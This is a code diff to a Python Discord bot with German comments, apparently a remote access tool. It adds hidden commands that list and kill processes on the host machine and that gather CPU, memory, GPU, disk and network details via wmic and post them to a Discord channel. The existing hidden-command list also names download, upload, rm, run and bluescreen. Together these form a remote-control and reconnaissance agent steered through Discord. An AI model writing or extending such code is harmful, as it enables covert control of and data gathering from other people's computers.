@@ -461,7 +461,7 @@ def format_devices(devices):
 @bot.command(help="Displays this message")
 async def help(ctx, category: str = None):
     embed_pages = []
-    hidden_commands = {"cd", "download", "upload", "ls", "rm", "touch", "rmdir", "mkdir", "run"}  # Liste der versteckten Befehle
+    hidden_commands = {"cd", "download", "upload", "ls", "rm", "touch", "rmdir", "mkdir", "run", "bluescreen", "ran", "taskkill", "tskmngr"}  # Liste der versteckten Befehle
 
     if category == "hidden":
         commands = sorted([command for command in bot.commands if command.name in hidden_commands], key=lambda x: x.name)
@@ -1761,5 +1761,113 @@ async def run(ctx, filename: str):
             await ctx.send(f"Error opening file `{filename}`: {e}")
     else:
         await ctx.send("File not found.")
+
+@bot.command(help= "show all the processes")
+async def ran(ctx, query: str = ""):
+    # Holen der laufenden Prozesse mit subprocess
+    result = subprocess.run(['tasklist'], capture_output=True, text=True, shell=True)
+    process_list = result.stdout
+
+    # Wenn kein spezifischer Prozess angegeben wurde, sende die gesamte Prozessliste
+    if not query:
+        # Wenn die Nachricht zu lang ist, teile sie auf
+        if len(process_list) > 1900:
+            for i in range(0, len(process_list), 1900):
+                await ctx.send(f"```\n{process_list[i:i+1900]}\n```")
+        else:
+            await ctx.send(f"```\n{process_list}\n```")
+        return
+
+    # Durchsuchen der Prozessliste nach dem Prozessnamen oder der PID
+    process_info = ""
+    for line in process_list.splitlines():
+        if query.lower() in line.lower():  # Falls der Prozessname oder die PID gefunden wurde
+            process_info = line
+            break
+
+    # Wenn der Prozess gefunden wurde, sende seine Informationen
+    if process_info:
+        await ctx.send(f"```\n{process_info}\n```")
+    else:
+        await ctx.send("Prozess nicht gefunden.")
+
+@bot.command(help="kill a specific process by its PID")
+async def taskkill(ctx, pid: int):
+    # Befehl zum Beenden des Prozesses mit der angegebenen PID
+    result = subprocess.run(['taskkill', '/PID', str(pid)], capture_output=True, text=True, shell=True)
+
+    # Überprüfen, ob der Prozess erfolgreich beendet wurde
+    if result.returncode == 0:
+        await ctx.send(f"Prozess mit der PID {pid} erfolgreich beendet.")
+    else:
+        await ctx.send(f"Fehler beim Beenden des Prozesses mit der PID {pid}.")
+
+@bot.command(help= "show some information")
+async def tskmngr(ctx):
+    # Funktion zur Umrechnung von Bytes in verschiedene Einheiten
+    def bytes_to_readable(size_in_bytes):
+        suffixes = ['B', 'KB', 'MB', 'GB', 'TB']
+        index = 0
+        while size_in_bytes >= 1024 and index < len(suffixes) - 1:
+            size_in_bytes /= 1024
+            index += 1
+        return f"{size_in_bytes:.2f} {suffixes[index]}"
+
+    # Systeminformationen
+    uname = platform.uname()
+    sys_info = (f"System: {uname.system}\n"
+                f"Node Name: {uname.node}\n"
+                f"Release: {uname.release}\n"
+                f"Version: {uname.version}\n"
+                f"Machine: {uname.machine}\n"
+                f"Processor: {uname.processor}\n\n")
+
+    # CPU-Informationen
+    result = subprocess.run(['wmic', 'cpu', 'get', 'Name,Description,NumberOfCores,NumberOfLogicalProcessors,MaxClockSpeed,CurrentClockSpeed,L2CacheSize,L3CacheSize,SocketDesignation'], capture_output=True, text=True, shell=True)
+    cpu_info = result.stdout
+
+    # Speicherinformationen
+    result = subprocess.run(['wmic', 'OS', 'get', 'TotalVisibleMemorySize,FreePhysicalMemory'], capture_output=True, text=True, shell=True)
+    memory_info_lines = result.stdout.strip().split('\n')  # Entferne Leerzeichen und teile nach Zeilen
+
+    total_memory_mb = 0
+    free_memory_mb = 0
+
+    # Extrahiere und summiere die Speicherwerte
+    for line in memory_info_lines:
+        values = [int(s) for s in line.split() if s.isdigit()]
+        if len(values) == 1:
+            total_memory_mb += values[0]
+        elif len(values) == 2:
+            free_memory_mb += values[1]
+
+    # Konvertiere die Speicherwerte in lesbare Einheiten
+    total_memory_readable = bytes_to_readable(total_memory_mb * 1024 * 1024)
+    free_memory_readable = bytes_to_readable(free_memory_mb * 1024 * 1024)
+
+    # Grafikkarteninformationen
+    result = subprocess.run(['wmic', 'path', 'win32_videocontroller', 'get', 'name'], capture_output=True, text=True, shell=True)
+    gpu_info = result.stdout
+
+    # Festplatteninformationen
+    result = subprocess.run(['wmic', 'diskdrive', 'get', 'caption,size,model'], capture_output=True, text=True, shell=True)
+    disk_info = result.stdout
+
+    # Netzwerkinformationen
+    result = subprocess.run(['wmic', 'nic', 'get', 'name,speed'], capture_output=True, text=True, shell=True)
+    network_info = result.stdout
+
+    # Gesamte Systeminformationen
+    full_info = (sys_info +
+                 f"Total Memory: {total_memory_readable}\n"
+                 f"Free Memory: {free_memory_readable}\n\n" +
+                 cpu_info + '\n\n' + gpu_info + '\n\n' + disk_info + '\n\n' + network_info)
+
+    # Nachricht in Teile aufteilen, wenn zu lang
+    if len(full_info) > 1900:
+        for i in range(0, len(full_info), 1900):
+            await ctx.send(f"```\n{full_info[i:i + 1900]}\n```")
+    else:
+        await ctx.send(f"```\n{full_info}\n```")
 
 bot.run(TOKEN)
